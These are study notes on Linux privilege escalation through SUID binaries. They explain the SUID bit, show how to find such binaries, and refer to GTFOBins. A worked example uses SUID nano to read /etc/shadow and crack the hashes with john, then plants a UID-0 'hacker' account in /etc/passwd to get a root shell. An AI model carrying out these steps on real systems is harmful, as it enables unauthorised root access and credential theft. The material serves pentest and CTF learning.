
# 🛡️ Privilege Escalation: SUID — Notes

## 🔹 1. What is SUID?

SUID stands for **Set-User ID**.

When the **SUID bit** is set on a file:

➡ **The program runs with the permissions of the file owner**,
not the user who executed it.

Most SUID binaries are owned by **root**, so:

* A normal user runs the program
* The program executes with **root’s privileges**

This can easily lead to privilege escalation if misconfigured.

---

## 🔹 2. Identifying SUID Binaries

Use this command to find all SUID files:

```bash
find / -type f -perm -4000 -ls 2>/dev/null
```

Explanation:

| Option        | Meaning                |
| ------------- | ---------------------- |
| `-type f`     | find files             |
| `-perm -4000` | find SUID files        |
| `2>/dev/null` | hide permission errors |

SUID files show an **s** in the user execute position:

```
-rwsr-xr-x 1 root root ...
  ^
  SUID bit
```

---

## 🔹 3. Why SUID Files Are Dangerous

A SUID binary owned by **root** can:

* Read root-only files (e.g., `/etc/shadow`)
* Modify protected files (e.g., `/etc/passwd`)
* Execute commands as root
* Spawn a root shell

Risks depend on how the binary functions.

Example dangerous SUID binaries:

* `vim`
* `nmap`
* `find`
* `less`
* `python`

---

## 🔹 4. GTFOBins — Exploiting SUID Binaries

Website:

👉 [https://gtfobins.github.io/#+suid](https://gtfobins.github.io/#+suid)

GTFOBins provides exploitation techniques for common binaries when SUID is set.

### Steps:

1. Enumerate SUID binaries
2. Look up each one on GTFOBins
3. Check if it has a **SUID exploit**
4. Execute the payload to gain root

Examples of exploitable SUID programs:

* `vim` → root shell
* `python` → root shell
* `find` → run commands as root
* `nmap` → interactive root shell

---

## 🔹 5. Example: SUID `nano` (Text Editor)

If nano is SUID-root:

```
-rwsr-xr-x 1 root root ... /usr/bin/nano
```

This means:

✔ `nano` runs as **root**
✔ Any file you open is read/written as **root**

Two common privesc scenarios:

---

### **A) Reading `/etc/shadow`**

```bash
nano /etc/shadow
```

Copy `passwd` + `shadow` entries to your attacker machine:

```bash
unshadow passwd.txt shadow.txt > hashes.txt
john hashes.txt
```

---

### **B) Adding a New Root User**

Generate password hash:

```bash
openssl passwd -1 mypass
```

Edit `/etc/passwd`:

```bash
nano /etc/passwd
```

Add this line:

```
hacker:$1$HASH...:0:0:root:/root:/bin/bash
```

Switch to new user:

```bash
su hacker
```

You now have a **root shell**.

---

## 🔹 6. Key Concepts

* ✔ SUID makes programs run as the **file owner**
* ✔ If the owner is **root**, this is extremely dangerous
* ✔ Custom or unusual SUID binaries = high-value targets
* ✔ Editors, interpreters, and file-manipulators are the most dangerous
* ✔ Always compare unknown SUID binaries with GTFOBins

---

## 🔹 7. Good SUID Enumeration Strategy

1. **List all SUID binaries**

   ```bash
   find / -type f -perm -4000 -ls 2>/dev/null
   ```

2. **Look for unusual entries**

   * Not default system binaries
   * Custom programs (e.g., in `/home/*` or `/opt/*`)
   * Anything unfamiliar

3. **Check GTFOBins for each**

4. **Try reading `/etc/shadow`**

   * Easy win on many boxes

5. **Try editing `/etc/passwd`**

   * Add your own root user if allowed

6. **Check for built-in commands**

   * Some SUID binaries allow command execution
   * E.g., `find`, `nmap`, `vim`, `python`

---

## ⭐ Summary

* **SUID = run as file owner**
* If owner is **root**, you can often escalate to root
* Use `find` to enumerate SUID binaries
* Use **GTFOBins** to exploit them
* Common SUID exploits:

  * Reading `/etc/shadow`
  * Editing `/etc/passwd`
  * Spawning a root shell through interpreters
  * Abusing custom SUID scripts or binaries
